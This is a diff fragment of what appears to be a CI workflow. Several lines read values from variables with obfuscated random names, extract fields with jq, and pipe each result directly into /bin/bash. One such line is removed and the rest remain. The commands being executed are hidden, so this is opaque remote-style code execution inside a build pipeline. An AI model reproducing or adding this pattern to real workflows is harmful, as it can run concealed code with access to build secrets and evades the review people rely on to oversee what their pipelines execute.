@@ -38,7 +38,6 @@ jobs:
           printf '%s' "$nem4974" | jq -r .k2 | /bin/bash
           echo $f58472 | jq -r .bw1669 | /bin/bash
           printf '%s' "$x3155" | jq -r .g078 | /bin/bash
-          printf '%s' "$avdzm524" | jq -r .vvksy136 | /bin/bash
           printf '%s' "$s05" | jq -r .vvhl19 | /bin/bash
           printf '%s' "$qrh77092" | jq -r .da113 | /bin/bash
           echo $vo5610 | jq -r .kvwy5245 | /bin/bash
